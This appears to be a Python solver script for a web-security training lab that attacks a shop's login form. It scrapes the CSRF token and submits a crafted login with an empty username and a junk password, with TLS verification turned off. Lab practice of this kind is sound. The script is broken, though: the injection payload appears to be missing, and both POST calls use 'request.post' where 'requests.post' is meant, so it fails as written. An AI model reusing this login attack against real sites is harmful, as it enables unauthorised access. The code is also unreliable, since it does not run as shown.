import re
import sys
import logging
import urllib3

import requests

import utils            # code to this script was written by @tjc_  https://youtu.be/YYsZpJ83azQ
from shop import Shop   # Shop class also written by @tjc_ 

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url)  # login url build into the class and this object
    if args.no_proxy:
        resp = requests.get(shop.login_url)
    else:
        resp = requests.get(shop.login_url, proxies=utils.PROXIES, verify=False)
    if not resp.status_code == 200:
        log.error("Could not get login page")
        sys.exit()
    else:
        # print(resp.text) # debugging 
        pattern = re.compile(r'name="csrf" value="(.*?)"')
        m = pattern.search(resp.text)
        csrf_token = m[1]
        data = {
            "csrf": csrf_token,
            "username": "",
            "password": "junkpass",
        }
        if args.no_proxy:    #    provide option to set proxy or run script with no proxy
            resp = request.post(shop.login_url, data=data)
        else:
            resp = request.post(
                shop.login_url, data=data, proxies=utils.PROXIES, verify=False
            )
        if resp.status_code == 200:
            utils.is_solved(shop.base_url)


if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)    
